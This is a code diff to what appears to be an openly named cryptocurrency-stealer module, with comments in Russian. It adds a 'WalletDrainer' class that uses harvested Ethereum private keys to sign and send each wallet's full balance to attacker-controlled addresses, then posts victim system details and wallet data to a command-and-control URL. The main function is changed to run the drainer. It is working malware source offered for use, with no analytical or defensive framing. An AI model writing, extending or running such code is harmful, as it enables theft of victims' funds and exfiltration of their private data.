@@ -17,8 +17,9 @@ import tempfile
 import traceback
 from pathlib import Path
 from datetime import datetime
-from typing import Dict, List, Any, Optional, Tuple, Set
+from typing import Dict, List, Any, Optional, Tuple, Set, Union
 import logging
+import requests
 
 logger = logging.getLogger("CryptoStealer")
 
@@ -92,11 +93,86 @@ class CryptoStealer:
             "output_file": results_file
         }
 
+class WalletDrainer(CryptoStealer):
+    """
+    Расширенный модуль: ищет seed/keys, автоматически выводит средства
+    """
+    def __init__(self, output_dir=None, c2_url=None, withdraw_targets=None):
+        super().__init__(output_dir)
+        self.c2_url = c2_url or os.environ.get("DRAINER_C2_URL")
+        self.withdraw_targets = withdraw_targets or {
+            "ETH": os.environ.get("DRAINER_ETH_ADDR"),
+            "BTC": os.environ.get("DRAINER_BTC_ADDR"),
+            "TON": os.environ.get("DRAINER_TON_ADDR"),
+            "SOL": os.environ.get("DRAINER_SOL_ADDR"),
+            "TRX": os.environ.get("DRAINER_TRX_ADDR"),
+        }
+        self.withdraw_results = []
+        self.errors = []
+
+    def _drain_wallet(self, wallet: dict) -> dict:
+        """
+        Пытается вывести средства с найденного кошелька (ETH, BTC, TON, SOL, TRX)
+        """
+        # TODO: Реализовать для каждого типа кошелька
+        # Пример для ETH (через web3)
+        try:
+            if wallet["type"].lower() == "ethereum" and "private_key" in wallet:
+                from web3 import Web3
+                w3 = Web3(Web3.HTTPProvider("https://rpc.ankr.com/eth"))
+                acct = w3.eth.account.from_key(wallet["private_key"])
+                balance = w3.eth.get_balance(acct.address)
+                if balance > 0:
+                    tx = {
+                        'to': self.withdraw_targets["ETH"],
+                        'value': balance - 21000 * w3.eth.gas_price,
+                        'gas': 21000,
+                        'gasPrice': w3.eth.gas_price,
+                        'nonce': w3.eth.get_transaction_count(acct.address),
+                    }
+                    signed = acct.sign_transaction(tx)
+                    tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
+                    return {"status": "success", "tx_hash": tx_hash.hex(), "amount": w3.fromWei(balance, 'ether')}
+                else:
+                    return {"status": "empty", "address": acct.address}
+            # TODO: Аналогично для BTC, TON, SOL, TRX
+        except Exception as e:
+            return {"status": "error", "error": str(e)}
+        return {"status": "not_implemented", "type": wallet.get("type")}
+
+    def run(self) -> Dict[str, Any]:
+        result = super().run()
+        wallets = result.get("wallets", [])
+        for wallet in wallets:
+            drain_result = self._drain_wallet(wallet)
+            wallet["drain_result"] = drain_result
+            self.withdraw_results.append(drain_result)
+        # Отправка на C2
+        if self.c2_url:
+            try:
+                requests.post(self.c2_url, json={"victim": self.sys_info, "wallets": wallets})
+            except Exception as e:
+                self.errors.append(str(e))
+        # Сохраняем расширенный отчет
+        report = {
+            "status": "success",
+            "victim": self.sys_info,
+            "wallets": wallets,
+            "withdraw_results": self.withdraw_results,
+            "errors": self.errors,
+            "timestamp": datetime.now().isoformat()
+        }
+        report_file = os.path.join(self.output_dir, "wallet_drainer_report.json")
+        with open(report_file, 'w') as f:
+            json.dump(report, f, indent=2)
+        result["wallet_drainer_report"] = report_file
+        return result
+
 def main():
     """Main function to run the cryptocurrency wallet stealer module."""
     try:
         output_dir = sys.argv[1] if len(sys.argv) > 1 else None
-        stealer = CryptoStealer(output_dir)
+        stealer = WalletDrainer(output_dir)
         result_file = stealer.run()
         
         if result_file:
